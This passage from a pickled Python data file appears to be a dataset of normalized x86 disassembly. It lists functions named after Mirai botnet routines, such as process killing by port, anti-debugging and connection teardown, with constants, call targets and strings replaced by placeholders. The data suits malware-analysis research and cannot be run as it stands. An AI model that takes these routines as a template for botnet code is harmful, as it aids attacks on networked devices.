Z~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nPUSH~EAX\nPUSH~EAX\nMOVZX~EBX,[ESP+0]\nLEA~EAX,[ESI+0]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~[ESI+0],0\nADD~EBX,EBP\nPOP~ECX\nPOP~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nLEA~EAX,[EBX+0]\nMOV~[EDI+0],0\nPUSH~EAX\nMOVZX~EAX,[EDI+0]\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nIMUL~EDX,[ESP+0],0\nMOV~ECX,[ESP+0]\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~[EDX+ECX+0],EAX\nMOV~AX,[EDI+0]\nMOV~[EDX+ECX+0],AX\nADD~EBX,0\nADD~EDX,ECX\nPUSH~0\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nPUSH~[ESP+0]\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p65
L1212L
tp66
a(S'checksum_generic'
p67
S'"PUSH~EBX\nXOR~EBX,EBX\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nJMP~FOO\nMOVZX~EAX,WORDPTR[EDX]\nSUB~ECX,0\nADD~EBX,EAX\nADD~EDX,0\nCMP~ECX,0\nJA~FOO\nJNZ~FOO\nMOVSX~EAX,BYTEPTR[EDX]\nADD~EBX,EAX\nMOV~EAX,EBX\nMOVZX~EDX,BX\nSHR~EAX,0\nPOP~EBX\nADD~EAX,EDX\nMOV~EDX,EAX\nSHR~EDX,0\nADD~EAX,EDX\nNOT~EAX\nMOVZX~EAX,AX\nRETN"'
p68
L60L
tp69
a(S'checksum_tcpudp'
p70
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~ESI,ESI\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EBX,[EDI+0]\nMOV~EBP,[EDI+0]\nMOV~[ESP+0],AX\nJMP~FOO\nMOVZX~EAX,WORDPTR[ECX]\nSUB~EDX,0\nADD~ESI,EAX\nADD~ECX,0\nCMP~EDX,0\nJG~FOO\nJNZ~FOO\nMOVZX~EAX,BYTEPTR[ECX]\nADD~ESI,EAX\nMOV~ECX,EBP\nMOV~EDX,EBP\nSHR~ECX,0\nAND~EDX,0\nMOVZX~AX,[EDI+0]\nROR~AX,0\nLEA~ECX,[ESI+ECX]\nMOVZX~EAX,AX\nADD~ECX,EAX\nMOVZX~EAX,BX\nSHR~EBX,0\nADD~EAX,EBX\nADD~EAX,EDX\nMOVZX~EDX,[ESP+0]\nADD~EAX,EDX\nLEA~EAX,[ECX+EAX]\nJMP~FOO\nAND~EAX,0\nADD~EAX,EDX\nMOV~EDX,EAX\nSHR~EDX,0\nJNZ~FOO\nNOT~EAX\nMOVZX~EAX,AX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p71
L138L
tp72
a(S'mem_exists'
p73
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~ESI,ECX\nMOV~EDI,[ESP+0]\nXOR~ECX,ECX\nMOV~EBX,EAX\nCMP~EDI,EDX\nJLE~FOO\nJMP~FOO\nMOV~AL,[EBX]\nCMP~AL,[ESI+ECX]\nJZ~FOO\nXOR~ECX,ECX\nJMP~FOO\nINC~ECX\nCMP~ECX,EDI\nJNZ~FOO\nMOV~EAX,0\nJMP~FOO\nINC~EBX\nDEC~EDX\nCMP~EDX,0\nJNZ~FOO\nXOR~EAX,EAX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p74
L55L
tp75
a(S'killer_kill'
p76
S'"SUB~ESP,0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nRETN"'
p77
L20L
tp78
a(S'killer_kill_by_port'
p79
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~EBX,[ESP+0]\nLEA~EDI,[ESP+0]\nROR~BX,0\nCLD\nSTOSD~,\nSTOSD~,\nSTOSD~,\nSTOSD~,\nLEA~EAX,[ESP+0]\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nMOVZX~EBX,BX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~AL,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nXOR~EAX,EAX\nCMP~EBP,0\nJZ~FOO\nJMP~FOO\nINC~EAX\nLEA~EBX,[ESP+0]\nMOV~DL,[EAX+EBX]\nTEST~DL,DL\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~ECX,[EAX+0]\nLEA~EAX,[EBX+ECX]\nJMP~FOO\nINC~EAX\nMOV~DL,[EAX]\nTEST~DL,DL\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~EDI,[ESP+0]\nMOV~ESI,EAX\nSUB~ESI,EDI\nLEA~EBX,[EDI+ECX]\nMOV~[ESP+ESI+0],0\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nLEA~EDX,[EDI+ESI]\nLEA~ECX,[ESI+0]\nXOR~EBX,EBX\nXOR~ESI,ESI\nXOR~EDI,EDI\nJMP~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~BL,0\nJMP~FOO\nDEC~BL\nJNZ~FOO\nINC~ESI\nCMP~ESI,0\nJNZ~FOO\nCMP~[EDX+0],0\nJNZ~FOO\nJMP~FOO\nXOR~EBX,EBX\nINC~EDX\nCMP~ESI,0\nJG~FOO\nMOV~AL,[EDX+0]\nINC~ECX\nTEST~AL,AL\nJNZ~FOO\nMOV~EAX,EDI\nMOV~EBX,ECX\nTEST~AL,AL\nJZ~FOO\nLEA~EAX,[ESP+ECX+0]\nJMP~FOO\nINC~ECX\nMOV~DL,[EAX]\nINC~EAX\nTEST~DL,DL\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nMOV~[ESP+ECX+0],0\nLEA~EBX,[ESP+EBX+0]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EAX\nPUSH~EBP\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nXOR~EAX,EAX\nJMP~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nPOP~EBP\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nXOR~EAX,EAX\nJMP~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nMOV~[ESP+0],0\nJZ~FOO\nJMP~FOO\nLEA~EDX,[EAX+0]\nMOV~[ESP+0],EDX\nMOV~AL,[EAX+0]\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nPUSH~ESI\nPUSH~ESI\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nPOP~EBP\nPOP~EDX\nLEA~EAX,[ESI+EAX]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],ESI\nMOV~EBX,EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[ESI+EAX]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EBP\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nPOP~ECX\nPOP~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],ESI\nMOV~EBX,EAX\nCALL~FOO\nPOP~EDI\nPOP~EBP\nLEA~EAX,[ESI+EAX]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nTEST~EAX,EAX\nJNZ~FOO\nJMP~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nLEA~EBP,[ESP+0]\nPUSH~EBP\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~EAX\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EBX+EAX]\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~ESI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EBX\nMOV~ESI,EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nLEA~EAX,[EBX+EAX]\nPUSH~ESI\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nPOP~ECX\nPOP~ESI\nLEA~EAX,[EBX+EAX]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nPOP~ESI\nPOP~EDX\nLEA~EAX,[EBX+EAX]\nMOV~EDX,[ESP+0]\nADD~EDX,0\nPUSH~EDX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBP\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOVSX~EAX,[ESP+0]\nADD~ESP,0\nJMP~FOO\nMOV~EDI,0\nINC~EDX\nXOR~EBX,EBX\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p80
L1305L
tp81
a(S'killer_init'
p82
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EBP,EAX\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,EAX\nTEST~EAX,EAX\nJG~FOO\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~EDI\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nPOP~ECX\nPOP~ESI\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~<STR>,EAX\nMOV~BYTEPTR[EAX],0\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nLEA~EBX,[ESI+EAX]\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nPOP~ECX\nPOP~EDI\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~EBX,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EDI\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~<STR>\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~EAX,<STR>\nMOV~BYTEPTR[EAX+EDX],0\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[EBX+EDI]\nMOV~EBX,EBP\nSUB~EAX,ESI\nPUSH~EAX\nPUSH~ESI\nMOV~ESI,0\nCALL~FOO\nMOV~[ESP+0],0\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~ECX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nJMP~FOO\nMOV~AL,[EDX+0]\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nSUB~ESP,0\nLEA~EBP,[EDX+0]\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nINC~[ESP+0]\nMOV~[ESP+0],EAX\nCMP~EAX,ESI\nJG~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~EAX,EBX\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nMOV~ESI,0\nJMP~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~EDX,0\nMOV~EAX,[ESP+0]\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nTEST~EDX,EDX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ESI\nPOP~EDI\nPUSH~EAX\nLEA~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nPOP~ECX\nPOP~EBX\nLEA~ESI,[EDI+EAX]\nPUSH~EBP\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESI+EBX]\nPUSH~EAX\nCALL~FOO\nPOP~ESI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~EAX\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~EBX,EAX\nPOP~EAX\nPOP~EDX\nPUSH~EBP\nPUSH~EBX\nCALL~FOO\nPOP~ECX\nPOP~EBP\nMOV~ESI,EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~EBX,ESI\nPOP~EBP\nPOP~EDX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+EAX+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBX-0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],EAX\nJZ~FOO\nCALL~FOO\nCMP~[ESP+0],EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~<STR>\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~ESI\nPOP~EBP\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~ECX\nPOP~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~ESI\nPOP~EBP\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~ECX\nPOP~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nJMP~FOO\nPUSH~[ESP+0]\nMOV~EDX,EBX\nMOV~ECX,[ESP+0]\nMOV~EAX,ESI\nCALL~FOO\nPOP~EDX\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~EDX,EBX\nMOV~ECX,[ESP+0]\nMOV~EAX,ESI\nCALL~FOO\nPOP~ECX\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~EDX,EBX\nMOV~ECX,[ESP+0]\nMOV~EAX,ESI\nCALL~FOO\nPOP~EDX\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~EDX,EBX\nMOV~ECX,[ESP+0]\nMOV~EAX,ESI\nCALL~FOO\nPOP~ECX\nTEST~AL,AL\nJNZ~FOO\nPUSH~[ESP+0]\nMOV~EDX,EBX\nMOV~ECX,EBP\nMOV~EAX,ESI\nCALL~FOO\nPOP~EDX\nTEST~AL,AL\nJNZ~FOO\nPUSH~EAX\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJG~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nJMP~FOO\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nTEST~EAX,EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p83
L1725L
tp84
a(S'anti_gdb_entry'
p85
S'"MOV~<STR>,0\nRETN"'
p86
L11L
tp87
a(S'teardown_connection'
p88
S'"SUB~ESP,0\nMOV~EAX,<STR>\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~<STR>,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p89
L49L
tp90
a(S'ensure_single_instance'
p91
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~[ESP+0],0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nMOV~<STR>,EAX\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nMOV~EAX,0\nCMP~<STR>,0\nJNZ~FOO\nMOV~EAX,<STR>\nMOV~[ESP+0],0\nMOV~[ESP+0],EAX\nMOV~[ESP+0],0\nCALL~FOO\nLEA~ESI,[ESP+0]\nMOV~EBX,EAX\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nCMP~DWORDPTR[EBX],0\nJNZ~FOO\nMOV~<STR>,0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPUSH~ECX\nPUSH~0\nPUSH~ESI\nPUSH~<STR>\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EDX\nPUSH~<STR>\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p92
L295L
tp93
a(S'main'
p94
S'"LEA~ECX,[ESP+0]\nAND~ESP,0\nPUSH~[ECX-0]\nPUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nPUSH~ECX\nSUB~ESP,0\nMOV~EAX,[ECX]\nMOV~ECX,[ECX+0]\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nPUSH~DWORDPTR[ECX]\nCALL~FOO\nPOP~EBP\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nPOP~ESI\nPOP~EDI\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJNZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nPUSH~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~<STR>,EAX\nLEA~EAX,[ESP+0]\nADD~ESP,0\nMOV~EBP,[EDX]\nMOV~<STR>,0\nMOV~<STR>,0\nMOV~<STR>,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nXOR~EDX,EDX\nMOV~EAX,0\nADD~ESP,0\nADD~EDX,[ESP+EAX*4+0]\nINC~EAX\nCMP~EAX,0\nJNZ~FOO\nTEST~EDX,EDX\nJZ~FOO\nXOR~ECX,ECX\nMOV~EDI,0\nMOV~ESI,0\nMOV~DL,[ESP+ECX+0]\nMOV~AL,[ESP+ECX+0]\nLEA~EBX,[ECX+ECX+0]\nMOV~[ESP+ESI+0],AL\nMOV~[ESP+ESI+0],DL\nMOV~EAX,EBX\nMOV~EDX,0\nSUB~ESP,0\nMOV~ECX,EDX\nCDQ~,\nIDIV~,ECX\nMOV~EBX,EAX\nPUSH~EBP